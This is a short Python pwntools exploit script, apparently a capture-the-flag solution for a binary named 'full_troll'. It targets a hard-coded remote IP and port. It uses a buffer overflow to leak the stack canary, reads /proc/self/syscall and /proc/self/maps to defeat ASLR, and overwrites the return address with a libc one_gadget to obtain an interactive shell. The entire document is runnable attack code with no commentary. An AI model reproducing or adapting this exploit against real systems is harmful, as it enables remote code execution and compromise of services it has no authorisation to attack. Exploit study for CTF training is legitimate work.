from pwn import *

libc = ELF("./libc.so.6")


#r = process('./full_troll')
r = remote('167.71.169.196', 2222)

payload = 'VibEv7xCXyK8AjPPRjwtp9X'.ljust(32, 'a') + 'a'*0x28 + 'x\x0a'
r.send(payload)

r.recvuntil('x')
canary = u64('\x00'+r.recvn(7))
print "canary = ", hex(canary)

payload = 'VibEv7xCXyK8AjPPRjwtp9X'.ljust(32, '\x00') + '/proc/self/syscall\x00'
r.sendlineafter('word.', payload)

r.recvuntil('0x')
r.recvuntil('0x')
r.recvuntil('0x')
r.recvuntil('0x')
heap_base = int(r.recvn(12), 16)-0x10
r.recvuntil('0x')
r.recvuntil('0x')
r.recvuntil('0x')
stack = int(r.recvn(12), 16)-0x10
r.recvuntil('0x')
libc_base = int(r.recvn(12), 16)-libc.symbols['read']-0x11
print "heap @ ", hex(heap_base)
print "stack @ ", hex(stack)
print "libc_base @ ", hex(libc_base)

payload = 'VibEv7xCXyK8AjPPRjwtp9X'.ljust(32, '\x00') + '/proc/self/maps\x00'
r.sendlineafter('word.', payload)
pie_base = int(r.recvn(13), 16)
print "pie = ", hex(pie_base)

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]
print "one_shot @ ", hex(one_shot)

payload = 'VibEv7xCXyK8AjPPRjwtp9X'.ljust(32, '\x00') + '\x00'*0x28+p64(canary)+'a'*0x8+p64(one_shot)
r.sendlineafter('word.', payload)
r.interactive()